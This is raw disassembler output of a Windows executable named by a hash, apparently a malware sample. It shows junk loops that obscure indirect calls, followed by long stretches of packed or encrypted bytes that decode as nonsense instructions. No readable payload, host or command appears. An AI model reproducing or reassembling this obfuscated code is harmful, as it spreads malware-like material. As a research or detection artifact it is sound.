
abf39cab4d9bdf6d2660c89c385293fb2b5074118e7930eae6bd4ba68be910e0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	adc    esi,ebx
  4012f5:	(bad)  
  4012f6:	jo     0x401368
  4012f8:	jo     0x40136a
  4012fa:	jo     0x40136c
  4012fc:	jle    0x40136e
  4012fe:	jo     0x4012c0
  401300:	xlat   BYTE PTR ds:[ebx]
  401301:	cmp    eax,0xcfd339d5
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	dec    ebp
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	dec    ebp
  4013a8:	std    
  4013a9:	xchg   ecx,eax
  4013aa:	(bad)  
  4013ab:	popf   
  4013ac:	add    ebx,edx
  4013ae:	mov    eax,0x915abc9e
  4013b3:	sbb    esp,edx
  4013b5:	mul    ebp
  4013b7:	aam    0x7
  4013b9:	pop    esp
  4013ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013bb:	mov    ds:0x1c94b96e,eax
  4013c0:	in     al,0x3c
  4013c2:	push   0x97ca48b2
  4013c7:	mov    ds:0x9882e572,eax
  4013cc:	xor    BYTE PTR [edi-0xe],0x24
  4013d0:	clc    
  4013d1:	stos   BYTE PTR es:[edi],al
  4013d2:	pop    eax
  4013d3:	(bad)  
  4013d4:	xor    BYTE PTR [edx+0x2cb7342c],al
  4013da:	out    dx,eax
  4013db:	ret    
  4013dc:	das    
  4013dd:	sub    ecx,DWORD PTR [eax+0x165792e9]
  4013e3:	mov    al,0xc1
  4013e5:	xchg   edx,eax
  4013e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013e7:	dec    ebx
  4013e8:	bnd jae 0x4013fa
  4013eb:	add    al,0x87
  4013ed:	push   esi
  4013ee:	jle    0x401449
  4013f0:	scas   al,BYTE PTR es:[edi]
  4013f1:	int3   
  4013f2:	adc    eax,0x8b153b65
  4013f7:	add    ebx,DWORD PTR [esi]
  4013f9:	xchg   DWORD PTR [edx+0x4a],ecx
  4013fc:	add    dl,0x8b
  4013ff:	ror    BYTE PTR [ecx],cl
  401401:	or     DWORD PTR [eax-0x7d],edx
  401404:	rcl    BYTE PTR [ecx+0x3e],1
  401407:	cmp    BYTE PTR [eax-0x796528db],ah
  40140d:	(bad)  
  40140e:	or     DWORD PTR ds:[ecx+eiz*1],ecx
  401412:	mov    edx,0xb46501c2
  401417:	test   DWORD PTR [ebx],edi
  401419:	cmp    edx,DWORD PTR [edx]
  40141b:	mov    esp,0xe4543953
  401420:	jge    0x40142a
  401422:	mov    esp,0x64365257
  401427:	shr    bh,1
  401429:	push   eax
  40142a:	xor    DWORD PTR [edi-0x7ca85fc5],eax
  401430:	sub    al,ah
  401432:	das    
  401433:	jle    0x4014b1
  401435:	lea    edi,fs:[esp]
  401439:	pop    ebp
  40143a:	adc    DWORD PTR [ebp+0x5965cdcb],0x1f
  401441:	jmp    0x40145a
  401443:	sub    DWORD PTR ds:[ecx+0x73],ebx
  401447:	mov    edx,0xc291ac04
  40144c:	push   cs
  40144d:	in     eax,0xc
  40144f:	out    dx,eax
  401450:	sub    eax,0xdbcb02f3
  401455:	mov    bl,BYTE PTR [ebx]
  401457:	pop    edi
  401458:	push   ss
  401459:	or     dh,BYTE PTR [ebp+0x70e9252b]
  40145f:	or     BYTE PTR [edi-0x2ab1028a],0xb5
  401466:	shr    BYTE PTR [edx+0x781e7636],1
  40146c:	xchg   ebx,eax
  40146d:	cmp    edx,DWORD PTR [ebx+edi*8]
  401470:	es in  eax,dx
  401472:	sbb    al,0x3e
  401474:	dec    ebp
  401475:	jle    0x401431
  401477:	pusha  
  401478:	out    0x59,al
  40147a:	lahf   
  40147b:	jb     0x4014a3
  40147d:	xchg   ebx,eax
  40147e:	sar    DWORD PTR [ecx],cl
  401480:	lods   eax,DWORD PTR ds:[esi]
  401481:	mov    ds:0x5065d291,eax
  401486:	pop    edx
  401487:	imul   edx,ebx,0xe217c47b
  40148d:	mov    bl,0x38
  40148f:	inc    ebp
  401490:	das    
  401491:	jle    0x4014bb
  401493:	push   0x28346ae3
  401498:	addr16 in eax,0x9a
  40149b:	stos   DWORD PTR es:[edi],eax
  40149c:	cmc    
  40149d:	mov    cl,0x75
  40149f:	jecxz  0x40146f
  4014a1:	add    BYTE PTR [edx+0x4b6b8f95],0x13
  4014a8:	ds es into 
  4014ab:	fsubr  QWORD PTR [esi]
  4014ad:	mov    dl,0x80
  4014af:	repz push esp
  4014b1:	iret   
  4014b2:	jg     0x4014cf
  4014b4:	sar    BYTE PTR [esi+0x2aceb4c0],0xef
  4014bb:	sbb    eax,0xecd4af6d
  4014c0:	adc    BYTE PTR [edx+0x5c],bl
  4014c3:	and    cl,ah
  4014c5:	and    bh,BYTE PTR [eax-0x60]
  4014c8:	test   bl,cl
  4014ca:	fisttp DWORD PTR [ecx+0x56dd4531]
  4014d0:	sbb    esp,esp
  4014d2:	bound  esp,QWORD PTR [edx-0x30f8f09e]
  4014d8:	lock xor ecx,edx
  4014db:	xchg   edx,eax
  4014dc:	push   esp
  4014dd:	mov    cl,0x3f
  4014df:	out    0x6e,al
  4014e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014e2:	xchg   esp,eax
  4014e3:	ins    DWORD PTR es:[edi],dx
  4014e4:	xor    dl,BYTE PTR [ebp+0x2d725bdd]
  4014ea:	pop    ss
  4014eb:	fdivrp st(2),st
  4014ed:	adc    cl,BYTE PTR [edi-0x18]
  4014f0:	jmp    0x40147d
  4014f2:	xchg   esp,eax
  4014f3:	inc    eax
  4014f5:	stos   BYTE PTR es:[edi],al
  4014f6:	or     bl,bh
  4014f8:	jmp    0x9850:0x74e1ce44
  4014ff:	mov    WORD PTR [ebp-0x4],ax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx+0x9c1fed]
  401516:	test   al,0xf9
  401518:	jo     0x401598
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	mov    DWORD PTR [edi-0x70],ebx
  401523:	(bad)  
  401524:	jle    0x401595
  401526:	and    al,0x6d
  401528:	sub    al,0x4b
  40152a:	arpl   WORD PTR gs:[ebx+0x33],ax
  40152e:	int3   
  40152f:	xor    ch,BYTE PTR [eax-0x39f5a36f]
  401535:	iret   
  401536:	(bad)  [edx]
  401538:	ret    
  401539:	cmp    esi,DWORD PTR [ebx]
  40153b:	repnz xor BYTE PTR [ebx],bl
  40153e:	inc    ebx
  40153f:	or     DWORD PTR [edi+0x2e],edx
  401542:	ds popf 
  401544:	xchg   esp,eax
  401545:	outs   dx,DWORD PTR ds:[esi]
  401546:	pop    ebp
  401547:	shl    BYTE PTR ds:0x5b93a50,cl
  40154d:	dec    edx
  40154e:	xchg   BYTE PTR [eax-0x77297304],dh
  401554:	je     0x401599
  401556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401557:	mov    esi,?
  401559:	inc    ebp
  40155a:	nop
  40155b:	add    al,0x6
  40155d:	ins    BYTE PTR es:[edi],dx
  40155e:	in     al,0x75
  401560:	xor    al,0x84
  401562:	jmp    0x1747:0x2b5541b2
  401569:	push   ebx
  40156a:	pushf  
  40156b:	lods   eax,DWORD PTR ds:[esi]
  40156c:	xchg   DWORD PTR [esi-0x2a],eax
  40156f:	stos   BYTE PTR es:[edi],al
  401570:	loopne 0x4015e7
  401572:	jb     0x4015bc
  401574:	repnz cmp bl,cl
  401577:	(bad)  
  401578:	pop    esi
  401579:	sbb    BYTE PTR [esi-0x65],bl
  40157c:	int    0x6f
  40157e:	mov    dh,0xfa
  401580:	icebp  
  401581:	dec    ebx
  401582:	jle    0x4015f3
  401584:	into   
  401585:	cdq    
  401586:	cwde   
  401587:	jle    0x401533
  401589:	fcomp  QWORD PTR ds:0x3064
  40158e:	push   esp
  40158f:	jnp    0x401538
  401591:	add    ch,dl
  401593:	out    dx,eax
  401594:	rol    DWORD PTR [eax+ebx*4-0x3e851cfb],0x61
  40159c:	mov    ds:0x5b80d2ab,eax
  4015a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015a2:	fs clc 
  4015a4:	lds    ebx,FWORD PTR [esi+0x55]
  4015a7:	xchg   edi,eax
  4015a8:	int    0x3b
  4015aa:	mov    WORD PTR [ecx],ds
  4015ac:	or     ebx,DWORD PTR [eax+0x3e]
  4015af:	stc    
  4015b0:	add    al,0x18
  4015b2:	adc    DWORD PTR [ebx],eax
  4015b4:	pop    ss
  4015b5:	sbb    BYTE PTR [eax-0x32],dh
  4015b8:	outs   dx,DWORD PTR ds:[esi]
  4015b9:	add    bl,BYTE PTR [edi+0x2b4967b1]
  4015bf:	out    dx,al
  4015c0:	jnp    0x401636
  4015c2:	out    dx,al
  4015c3:	cmp    dh,BYTE PTR [ecx+0x21a61d8b]
  4015c9:	into   
  4015ca:	rcr    DWORD PTR [eax+0x5f4a9252],cl
  4015d0:	jmp    0xaa81:0x5c12fb17
  4015d7:	or     ecx,DWORD PTR [ecx-0xe21518c]
  4015dd:	xor    eax,0x44c1fb1f
  4015e2:	out    dx,eax
  4015e3:	jp     0x4015ef
  4015e5:	les    eax,FWORD PTR ds:0x2c0d0f1f
  4015eb:	pop    esp
  4015ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015ed:	fnstcw WORD PTR [ebp+0x22595740]
  4015f3:	push   esi
  4015f4:	ror    BYTE PTR [esi-0x6c],0x44
  4015f8:	adc    BYTE PTR [ecx+0x57],dh
  4015fb:	dec    edi
  4015fc:	arpl   WORD PTR [edi],sp
  4015fe:	pop    ebx
  4015ff:	mov    eax,0xd969c60f
  401604:	(bad)  [eax-0x29c99e24]
  40160a:	ror    dh,1
  40160c:	nop
  40160d:	loope  0x4015ef
  40160f:	ins    DWORD PTR es:[edi],dx
  401610:	es stos DWORD PTR es:[edi],eax
  401612:	ins    DWORD PTR es:[edi],dx
  401613:	daa    
  401614:	adc    DWORD PTR [ebp-0x13],edx
  401617:	addr16 mov eax,0x6ae0d3d9
  40161d:	(bad)  
  40161e:	not    DWORD PTR [esi-0x34f37f3b]
  401624:	in     eax,0x15
  401626:	xor    eax,0x48c7cdde
  40162b:	nop
  40162c:	jge    0x401671
  40162e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40162f:	mov    ebx,0x54837349
  401634:	xor    dh,BYTE PTR ds:0xa11054da
  40163a:	aaa    
  40163b:	or     BYTE PTR [esi+ebx*4+0x776b031c],cl
  401642:	cmp    eax,0x656404da
  401647:	clc    
  401648:	mov    ebx,0x166cc6b6
  40164d:	cs or  al,0xc0
  401650:	inc    eax
  401651:	stc    
  401652:	push   edx
  401653:	(bad)  
  401654:	bound  ebp,QWORD PTR ds:0x6b1d2174
  40165a:	stc    
  40165b:	dec    edi
  40165c:	je     0x4015f2
  40165e:	sbb    eax,0xd1fa7548
  401663:	adc    ebx,0xfffffff1
  401666:	xor    ebp,ecx
  401668:	iret   
  401669:	gs lahf 
  40166b:	mov    DWORD PTR cs:[ebx],esi
  40166e:	sbb    DWORD PTR [ebx+esi*8],esp
  401671:	mov    WORD PTR [ebp+0x31703ce6],ds
  401677:	sub    DWORD PTR [edx+0x37615d8c],0x4c36d4ad
  401681:	rcl    BYTE PTR [ebx],1
  401683:	and    DWORD PTR [ebp-0x3d],esp
  401686:	addr16 xor eax,0x460aae4d
  40168c:	outs   dx,BYTE PTR ds:[esi]
  40168d:	inc    ecx
  40168e:	sub    BYTE PTR [ebp+eiz*4-0x45f9f973],ah
  401695:	push   ds
  401696:	fadd   DWORD PTR [ebx-0x75cf2ea9]
  40169c:	jbe    0x401703
  40169e:	popf   
  40169f:	push   ebx
  4016a0:	call   DWORD PTR [ebp+0x66]
  4016a3:	jmp    0x5d5d265d
  4016a8:	int    0xf3
  4016aa:	cs cmp ebp,esp
  4016ad:	and    DWORD PTR [eax],0xc959cfe6
  4016b3:	mov    bh,0x9d
  4016b5:	jmp    0x29a45a7
  4016ba:	stos   DWORD PTR es:[edi],eax
  4016bb:	push   ebp
  4016bc:	dec    edx
  4016bd:	and    eax,0x982aa08e
  4016c2:	test   al,0x69
  4016c4:	(bad)  
  4016c5:	dec    edi
  4016c6:	xchg   esi,eax
  4016c7:	xor    ch,BYTE PTR [edi+ecx*4]
  4016ca:	mov    esi,0x5308bd7c
  4016cf:	popa   
  4016d0:	fdiv   DWORD PTR [esi]
  4016d2:	fisttp WORD PTR [ebp-0x21a343f9]
  4016d8:	imul   ecx,esp,0xe
  4016db:	retf   
  4016dc:	add    cl,BYTE PTR [ecx+0x2acac8cd]
  4016e2:	mov    eax,DWORD PTR ds:0x18431d2f
  4016e8:	mov    ch,0x78
  4016ea:	mov    bl,0x98
  4016ec:	ss mov esp,0x4a2d5cb6
  4016f2:	out    0x8a,eax
  4016f4:	mov    eax,ds:0xfcdd0b35
  4016f9:	mov    ah,0x96
  4016fb:	xchg   ebp,eax
  4016fc:	test   eax,0x21df3529
  401701:	shl    edx,cl
  401703:	in     eax,0xd8
  401705:	hlt    
  401706:	pop    edx
  401707:	lahf   
  401708:	jb     0x4016ec
  40170a:	xchg   edi,eax
  40170b:	ins    BYTE PTR es:[edi],dx
  40170c:	pop    edx
  40170d:	test   BYTE PTR [ebx+0x23326976],ah
  401713:	outs   dx,DWORD PTR ds:[esi]
  401714:	out    0x5,al
  401716:	cmp    BYTE PTR [edx],bl
  401718:	(bad)  
  40171a:	and    al,0x77
  40171c:	data16 adc al,0x5
  40171f:	pop    eax
  401720:	lea    eax,[ebp-0x30]
  401723:	mov    DWORD PTR [ebp-0x34],eax
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	sub    BYTE PTR [ecx+0xd],ch
  401743:	xor    DWORD PTR [eax+0x7c],esi
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	enter  0x36d5,0x85
  401750:	out    0x8e,al
  401752:	push   edi
  401753:	int3   
  401754:	popa   
  401755:	mov    gs,esi
  401757:	cdq    
  401758:	sub    eax,DWORD PTR [edx]
  40175a:	add    ebp,DWORD PTR [esi+0x62]
  40175d:	in     al,0x52
  40175f:	shr    BYTE PTR [edx-0x41],0x25
  401763:	inc    esp
  401764:	clc    
  401765:	mov    WORD PTR [edi+0x59],ss
  401768:	inc    esp
  401769:	repnz mov esp,0x3a502d0b
  40176f:	gs pusha 
  401771:	xor    edx,DWORD PTR [ebp+0x68]
  401774:	stc    
  401775:	mov    al,ds:0xeeba8a0a
  40177a:	sub    al,0x54
  40177c:	sub    esp,DWORD PTR [ebx-0x63]
  40177f:	mov    cl,0x32
  401781:	int3   
  401782:	mov    bl,0x73
  401784:	ins    BYTE PTR es:[edi],dx
  401785:	mov    BYTE PTR [eax],ah
  401787:	les    ebx,FWORD PTR [eax]
  401789:	or     dh,BYTE PTR [eax]
  40178b:	ret    
  40178c:	fldcw  WORD PTR [eax+ebp*8-0x54]
  401790:	cmp    BYTE PTR [ebx],dh
  401792:	mul    BYTE PTR [eax+0x5dc76bf9]
  401798:	(bad)  [ebx-0x25]
  40179b:	pushf  
  40179c:	pop    edi
  40179d:	icebp  
  40179e:	inc    ecx
  40179f:	mov    ecx,0x29924acc
  4017a4:	fistp  DWORD PTR [edi]
  4017a6:	jecxz  0x40172a
  4017a8:	push   eax
  4017a9:	and    BYTE PTR [edx-0x41],bh
  4017ac:	pop    esp
  4017ad:	cmp    BYTE PTR [edi],0xe4
  4017b0:	mov    ebx,0x5a8e08d0
  4017b5:	aam    0x34
  4017b7:	mov    edx,0x81aa870f
  4017bc:	and    BYTE PTR [edi],al
  4017be:	mov    edi,0x1f61da79
  4017c3:	leave  
  4017c4:	jno    0x40175c
  4017c6:	lock je 0x401829
  4017c9:	(bad)  
  4017ca:	xlat   BYTE PTR ds:[ebx]
  4017cb:	imul   ebp,DWORD PTR [eax],0x48f0e869
  4017d1:	push   edi
  4017d3:	(bad)  
  4017d4:	or     eax,0xf678ab22
  4017d9:	inc    esp
  4017da:	retf   
  4017db:	in     eax,0x1f
  4017dd:	cdq    
  4017de:	arpl   WORD PTR [ebx],ax
  4017e0:	sbb    eax,0xbc9e57b8
  4017e5:	mov    edi,0xcac2d8e5
  4017ea:	and    ebx,esi
  4017ec:	cld    
  4017ed:	xor    DWORD PTR [ecx],0xb79eccff
  4017f3:	jmp    0x5640:0x1765ac4c
  4017fa:	test   DWORD PTR [edx-0x598b7cf6],edi
  401800:	dec    ebx
  401801:	jp     0x4017ab
  401803:	adc    DWORD PTR [edi],ebp
  401805:	fs fwait
  401807:	adc    ecx,DWORD PTR [edx]
  401809:	jg     0x401817
  40180b:	loop   0x4017da
  40180d:	fcomi  st,st(2)
  40180f:	lds    edi,FWORD PTR [eax+eiz*8-0x63]
  401813:	mov    WORD PTR [ebx+0x458efee3],ss
  401819:	data16 fistp WORD PTR [ecx-0x2e4df6d4]
  401820:	xchg   BYTE PTR [edi+0x4082da5b],ah
  401826:	call   0x80e0:0xfcc6787c
  40182d:	in     eax,0xc9
  40182f:	lahf   
  401830:	das    
  401831:	or     al,0xa7
  401833:	inc    ecx
  401834:	jmp    0x401858
  401836:	adc    al,0x19
  401838:	ror    cl,0x19
  40183b:	dec    edx
  40183c:	adc    edi,DWORD PTR [ebp*4+0x113b5528]
  401843:	div    BYTE PTR [ebx]
  401845:	clc    
  401846:	clc    
  401847:	inc    ecx
  401848:	ret    0x6e3c
  40184b:	cli    
  40184c:	pop    ds
  40184d:	jle    0x40188f
  40184f:	push   ebp
  401850:	adc    bh,BYTE PTR [esi+0x72]
  401853:	add    al,BYTE PTR [eax+0x1fd93ee0]
  401859:	loopne 0x401826
  40185b:	dec    DWORD PTR [ebp+0x3b]
  40185e:	cwde   
  40185f:	jb     0x4018cf
  401861:	sar    DWORD PTR [ebp-0x27d3bc],cl
  401867:	out    0x84,eax
  401869:	rcl    DWORD PTR [esi+0x44],0x7
  40186d:	inc    edi
  40186e:	mov    al,0x4d
  401870:	push   esi
  401871:	inc    eax
  401872:	int3   
  401873:	sbb    ebx,DWORD PTR [ebx-0x15]
  401876:	xor    al,0x34
  401878:	mov    bl,0x87
  40187a:	add    BYTE PTR [esi-0x4a],cl
  40187d:	imul   esp,ebx,0x25
  401880:	inc    ebp
  401881:	lock add esp,DWORD PTR cs:[eax+0x3ef967f3]
  401889:	mov    ds:0xdc4809ed,al
  40188e:	xor    edi,ecx
  401890:	cmc    
  401891:	mov    ecx,DWORD PTR [ecx]
  401893:	add    eax,0x2a0ffadf
  401898:	outs   dx,DWORD PTR ds:[esi]
  401899:	cmc    
  40189a:	xor    dh,BYTE PTR [ecx-0x3a2ce457]
  4018a0:	jbe    0x401906
  4018a2:	xor    eax,0xdaa7a0be
  4018a7:	mov    ecx,edx
  4018a9:	rol    al,0xd3
  4018ac:	add    BYTE PTR [ecx+edi*1],ah
  4018af:	hlt    
  4018b0:	in     eax,dx
  4018b1:	arpl   WORD PTR [edx+0x52],dx
  4018b4:	xor    al,0x3
  4018b6:	stos   BYTE PTR es:[edi],al
  4018b7:	cmp    bl,ah
  4018b9:	sbb    DWORD PTR [edx-0x6baa2c87],0x48
  4018c0:	inc    edx
  4018c1:	in     al,0x44
  4018c3:	loopne 0x40189e
  4018c5:	jae    0x401906
  4018c7:	xchg   BYTE PTR [ebp+0x2],al
  4018ca:	pop    ss
  4018cb:	es scas eax,DWORD PTR es:[edi]
  4018cd:	out    0x50,eax
  4018cf:	sub    BYTE PTR [eax],dh
  4018d1:	sub    BYTE PTR [ebp-0x22ccbfe9],bh
  4018d7:	jbe    0x40193e
  4018d9:	call   0x5bba763d
  4018de:	and    DWORD PTR [edi+0x1cd610b9],edx
  4018e4:	jbe    0x401917
  4018e6:	adc    DWORD PTR [ebx-0x52],ecx
  4018e9:	ins    DWORD PTR es:[edi],dx
  4018ea:	inc    bh
  4018ec:	push   edx
  4018ed:	fs mov ah,0xfe
  4018f0:	call   0x16fd661e
  4018f5:	pop    edi
  4018f6:	dec    esi
  4018f7:	or     eax,0xf601b13d
  4018fc:	adc    cl,BYTE PTR [ebx+0x7ae651a2]
  401902:	test   BYTE PTR [ebx+0x13],0x4
  401906:	out    dx,al
  401907:	je     0x4018cb
  401909:	(bad)  
  40190b:	addr16 inc edi
  40190d:	sti    
